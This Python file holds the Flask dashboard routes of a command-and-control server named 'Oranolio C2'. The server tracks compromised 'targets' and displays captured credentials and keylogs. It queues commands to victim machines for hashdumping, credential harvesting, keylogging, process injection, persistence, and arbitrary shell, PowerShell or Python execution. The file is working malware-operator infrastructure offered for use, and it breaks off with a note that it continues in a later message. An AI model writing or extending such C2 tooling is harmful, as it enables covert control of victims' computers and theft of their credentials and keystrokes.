#!/usr/bin/env python3
"""
PRODUCTION-GRADE Dashboard Routes for Oranolio C2
Full database integration, advanced features, real-time updates
"""

import os
import sys
import json
import logging
import hashlib
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Tuple

from flask import Blueprint, render_template, request, jsonify, session, send_file, g
from werkzeug.utils import secure_filename
from werkzeug.exceptions import BadRequest, NotFound, Forbidden

# Add paths
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Core'))

# Import core systems
from Core.database import EliteDatabase
from Core.logger import get_logger
from auth_utils import login_required

# Initialize
logger = get_logger('dashboard')
db = EliteDatabase()

# Create blueprint
dashboard_bp = Blueprint('dashboard', __name__, url_prefix='/dashboard')

# Configuration
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py', 'exe', 'zip', 'rar', 'dll', 'bat', 'ps1', '7z', 'tar', 'gz'}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
ITEMS_PER_PAGE = 50

# Ensure directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# ============================================================================
# UTILITIES
# ============================================================================

def allowed_file(filename: str) -> bool:
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def audit_log(action: str, target: str = None, details: str = None):
    """Log user action to audit trail"""
    try:
        db.add_audit_log(
            user=session.get('username', 'unknown'),
            action=action,
            target=target,
            details=details,
            ip_address=request.remote_addr
        )
    except Exception as e:
        logger.error(f"Failed to write audit log: {e}")

def paginate(query_func, page: int = 1, per_page: int = ITEMS_PER_PAGE):
    """Paginate query results"""
    offset = (page - 1) * per_page
    items = query_func(limit=per_page, offset=offset)
    total = query_func(count_only=True)
    
    return {
        'items': items,
        'page': page,
        'per_page': per_page,
        'total': total,
        'pages': (total + per_page - 1) // per_page
    }

def api_response(data=None, error=None, status=200):
    """Standardized API response"""
    if error:
        return jsonify({'success': False, 'error': error}), status
    return jsonify({'success': True, 'data': data}), status

# ============================================================================
# DASHBOARD PAGES
# ============================================================================

@dashboard_bp.route('/')
@dashboard_bp.route('/overview')
@login_required
def overview():
    """Dashboard overview page"""
    audit_log('view_dashboard', 'overview')
    return render_template('dashboard/overview.html')

@dashboard_bp.route('/targets')
@login_required
def targets():
    """Targets management page"""
    audit_log('view_targets')
    return render_template('dashboard/targets.html')

@dashboard_bp.route('/commands')
@login_required
def commands():
    """Command execution page"""
    audit_log('view_commands')
    return render_template('dashboard/commands.html')

@dashboard_bp.route('/files')
@login_required
def files():
    """File management page"""
    audit_log('view_files')
    return render_template('dashboard/files.html')

@dashboard_bp.route('/credentials')
@login_required
def credentials():
    """Credentials page"""
    audit_log('view_credentials')
    return render_template('dashboard/credentials.html')

@dashboard_bp.route('/keylogs')
@login_required
def keylogs():
    """Keylogger page"""
    audit_log('view_keylogs')
    return render_template('dashboard/keylogs.html')

@dashboard_bp.route('/logs')
@login_required
def logs():
    """System logs page"""
    audit_log('view_logs')
    return render_template('dashboard/logs.html')

@dashboard_bp.route('/settings')
@login_required
def settings():
    """Settings page"""
    audit_log('view_settings')
    return render_template('dashboard/settings.html')

@dashboard_bp.route('/help')
@login_required
def help():
    """Help and documentation page"""
    return render_template('dashboard/help.html')

# ============================================================================
# OVERVIEW API
# ============================================================================

@dashboard_bp.route('/api/dashboard/overview')
@login_required
def api_overview():
    """Get comprehensive dashboard overview data"""
    try:
        # Get all agents
        all_agents = db.get_all_agents()
        active_agents = [a for a in all_agents if a['status'] == 'active']
        
        # Calculate time ranges
        now = datetime.now()
        today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
        week_ago = now - timedelta(days=7)
        
        # Get commands executed today
        commands_today = db.get_commands_by_date_range(today_start, now)
        
        # Get credentials
        all_credentials = db.get_all_credentials()
        creds_today = [c for c in all_credentials if datetime.fromisoformat(c['collected_at']) >= today_start]
        
        # Calculate success rate
        recent_results = db.get_recent_results(limit=100)
        successful = len([r for r in recent_results if r['exit_code'] == 0])
        success_rate = int((successful / len(recent_results) * 100)) if recent_results else 0
        
        # Get recent activity
        recent_activity = []
        
        # Recent agent connections
        for agent in sorted(all_agents, key=lambda x: x['first_seen'], reverse=True)[:5]:
            recent_activity.append({
                'type': 'target_connected',
                'message': f"Target connected: {agent['hostname']}",
                'timestamp': agent['first_seen']
            })
        
        # Recent commands
        for cmd in db.get_recent_commands(limit=5):
            recent_activity.append({
                'type': 'command_executed',
                'message': f"Command executed: {cmd['command'][:50]}",
                'timestamp': cmd['created_at']
            })
        
        # Recent credentials
        for cred in sorted(all_credentials, key=lambda x: x['collected_at'], reverse=True)[:5]:
            recent_activity.append({
                'type': 'credential_captured',
                'message': f"Credential captured: {cred['username']}",
                'timestamp': cred['collected_at']
            })
        
        # Sort by timestamp
        recent_activity.sort(key=lambda x: x['timestamp'], reverse=True)
        recent_activity = recent_activity[:10]
        
        # Calculate target change percentage
        week_old_agents = [a for a in all_agents if datetime.fromisoformat(a['first_seen']) < week_ago]
        targets_change = int(((len(active_agents) - len(week_old_agents)) / max(len(week_old_agents), 1)) * 100)
        
        data = {
            'stats': {
                'active_targets': len(active_agents),
                'commands_today': len(commands_today),
                'total_credentials': len(all_credentials),
                'success_rate': success_rate,
                'targets_change': targets_change,
                'creds_today': len(creds_today)
            },
            'recent_activity': recent_activity,
            'active_targets': [
                {
                    'id': agent['id'],
                    'hostname': agent['hostname'],
                    'ip_address': agent['ip_address'],
                    'os_info': agent['platform'],
                    'user_info': agent['username'],
                    'last_seen': agent['last_seen']
                }
                for agent in active_agents[:10]
            ]
        }
        
        return api_response(data)
        
    except Exception as e:
        logger.error(f"Error getting overview data: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# TARGETS API
# ============================================================================

@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    """Get all targets with filtering and pagination"""
    try:
        # Get query parameters
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        status_filter = request.args.get('status', 'all')
        search = request.args.get('search', '')
        
        # Get all agents
        all_agents = db.get_all_agents()
        
        # Apply filters
        filtered_agents = all_agents
        
        if status_filter != 'all':
            filtered_agents = [a for a in filtered_agents if a['status'] == status_filter]
        
        if search:
            search_lower = search.lower()
            filtered_agents = [
                a for a in filtered_agents
                if search_lower in a['hostname'].lower() or
                   search_lower in (a['ip_address'] or '').lower() or
                   search_lower in (a['username'] or '').lower()
            ]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_agents = filtered_agents[start:end]
        
        # Format response
        targets = [
            {
                'id': agent['id'],
                'hostname': agent['hostname'],
                'ip_address': agent['ip_address'],
                'os_info': agent['platform'] or 'Unknown',
                'user_info': agent['username'] or 'Unknown',
                'first_seen': agent['first_seen'],
                'last_seen': agent['last_seen'],
                'is_active': agent['status'] == 'active',
                'connection_count': db.get_agent_connection_count(agent['id'])
            }
            for agent in paginated_agents
        ]
        
        return api_response({
            'targets': targets,
            'total': len(filtered_agents),
            'page': page,
            'per_page': per_page,
            'pages': (len(filtered_agents) + per_page - 1) // per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting targets: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/<target_id>')
@login_required
def api_target_details(target_id):
    """Get detailed target information"""
    try:
        agent = db.get_agent(target_id)
        
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Get additional stats
        command_count = len(db.get_agent_commands(target_id))
        credential_count = len(db.get_agent_credentials(target_id))
        file_count = len(db.get_agent_files(target_id))
        
        # Parse metadata
        metadata = json.loads(agent.get('metadata', '{}'))
        
        target_data = {
            'id': agent['id'],
            'hostname': agent['hostname'],
            'ip_address': agent['ip_address'],
            'os_info': agent['platform'],
            'user_info': agent['username'],
            'architecture': agent['architecture'],
            'privileges': agent['privileges'],
            'first_seen': agent['first_seen'],
            'last_seen': agent['last_seen'],
            'last_beacon': agent['last_beacon'],
            'is_active': agent['status'] == 'active',
            'connection_count': db.get_agent_connection_count(agent['id']),
            'command_count': command_count,
            'credential_count': credential_count,
            'file_count': file_count,
            'metadata': metadata
        }
        
        audit_log('view_target_details', target_id)
        return api_response(target_data)
        
    except Exception as e:
        logger.error(f"Error getting target details: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/count')
@login_required
def api_targets_count():
    """Get active targets count"""
    try:
        active_count = len([a for a in db.get_all_agents() if a['status'] == 'active'])
        return api_response({'count': active_count})
    except Exception as e:
        logger.error(f"Error getting targets count: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/<target_id>/disconnect', methods=['POST'])
@login_required
def api_disconnect_target(target_id):
    """Disconnect a target"""
    try:
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        db.set_agent_status(target_id, 'disconnected')
        audit_log('disconnect_target', target_id)
        
        return api_response({'message': 'Target disconnected'})
        
    except Exception as e:
        logger.error(f"Error disconnecting target: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# COMMANDS API
# ============================================================================

@dashboard_bp.route('/api/commands')
@login_required
def api_commands():
    """Get available commands organized by category"""
    try:
        commands = {
            'system': [
                {'name': 'whoami', 'description': 'Get current user', 'category': 'system'},
                {'name': 'hostname', 'description': 'Get system hostname', 'category': 'system'},
                {'name': 'sysinfo', 'description': 'Get detailed system information', 'category': 'system'},
                {'name': 'pwd', 'description': 'Get current working directory', 'category': 'system'},
                {'name': 'env', 'description': 'List environment variables', 'category': 'system'},
                {'name': 'uptime', 'description': 'Get system uptime', 'category': 'system'}
            ],
            'file': [
                {'name': 'ls', 'description': 'List directory contents', 'category': 'file'},
                {'name': 'cat', 'description': 'Display file contents', 'category': 'file'},
                {'name': 'download', 'description': 'Download file from target', 'category': 'file'},
                {'name': 'upload', 'description': 'Upload file to target', 'category': 'file'},
                {'name': 'rm', 'description': 'Remove file', 'category': 'file'},
                {'name': 'mkdir', 'description': 'Create directory', 'category': 'file'},
                {'name': 'find', 'description': 'Search for files', 'category': 'file'}
            ],
            'network': [
                {'name': 'ping', 'description': 'Ping a host', 'category': 'network'},
                {'name': 'netstat', 'description': 'Show network connections', 'category': 'network'},
                {'name': 'ifconfig', 'description': 'Show network interfaces', 'category': 'network'},
                {'name': 'portscan', 'description': 'Scan ports on target', 'category': 'network'},
                {'name': 'dns', 'description': 'DNS lookup', 'category': 'network'}
            ],
            'process': [
                {'name': 'ps', 'description': 'List running processes', 'category': 'process'},
                {'name': 'kill', 'description': 'Terminate process', 'category': 'process'},
                {'name': 'tasklist', 'description': 'Detailed process list', 'category': 'process'},
                {'name': 'inject', 'description': 'Inject into process', 'category': 'process'}
            ],
            'security': [
                {'name': 'screenshot', 'description': 'Capture screenshot', 'category': 'security'},
                {'name': 'keylog start', 'description': 'Start keylogger', 'category': 'security'},
                {'name': 'keylog stop', 'description': 'Stop keylogger', 'category': 'security'},
                {'name': 'hashdump', 'description': 'Dump password hashes', 'category': 'security'},
                {'name': 'credentials', 'description': 'Harvest stored credentials', 'category': 'security'},
                {'name': 'clipboard', 'description': 'Get clipboard contents', 'category': 'security'}
            ],
            'persistence': [
                {'name': 'persist install', 'description': 'Install persistence', 'category': 'persistence'},
                {'name': 'persist remove', 'description': 'Remove persistence', 'category': 'persistence'},
                {'name': 'persist check', 'description': 'Check persistence status', 'category': 'persistence'}
            ],
            'recon': [
                {'name': 'recon full', 'description': 'Full system reconnaissance', 'category': 'recon'},
                {'name': 'recon network', 'description': 'Network reconnaissance', 'category': 'recon'},
                {'name': 'recon users', 'description': 'Enumerate users', 'category': 'recon'},
                {'name': 'recon software', 'description': 'List installed software', 'category': 'recon'}
            ],
            'custom': [
                {'name': 'shell', 'description': 'Execute shell command', 'category': 'custom'},
                {'name': 'powershell', 'description': 'Execute PowerShell command', 'category': 'custom'},
                {'name': 'python', 'description': 'Execute Python code', 'category': 'custom'}
            ]
        }
        
        return api_response(commands)
        
    except Exception as e:
        logger.error(f"Error getting commands: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/execute', methods=['POST'])
@login_required
def api_execute():
    """Execute command on target"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        command = data.get('command')
        
        if not target_id or not command:
            return api_response(error='Missing target_id or command', status=400)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        if agent['status'] != 'active':
            return api_response(error='Target is not active', status=400)
        
        # Queue command
        command_id = db.add_command(target_id, command)
        
        audit_log('execute_command', target_id, f"Command: {command}")
        logger.info(f"Command {command_id} queued for agent {target_id}: {command}")
        
        return api_response({
            'command_id': command_id,
            'status': 'queued',
            'message': 'Command queued for execution',
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error executing command: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/commands/history')
@login_required
def api_command_history():
    """Get command execution history"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        
        if target_id:
            commands = db.get_agent_commands(target_id)
        else:
            commands = db.get_all_commands()
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_commands = commands[start:end]
        
        # Get results for each command
        history = []
        for cmd in paginated_commands:
            result = db.get_command_result(cmd['id'])
            history.append({
                'id': cmd['id'],
                'agent_id': cmd['agent_id'],
                'command': cmd['command'],
                'status': cmd['status'],
                'created_at': cmd['created_at'],
                'executed_at': cmd.get('executed_at'),
                'completed_at': cmd.get('completed_at'),
                'output': result.get('output') if result else None,
                'error': result.get('error') if result else None,
                'exit_code': result.get('exit_code') if result else None
            })
        
        return api_response({
            'history': history,
            'total': len(commands),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting command history: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# Continue in next message due to length...
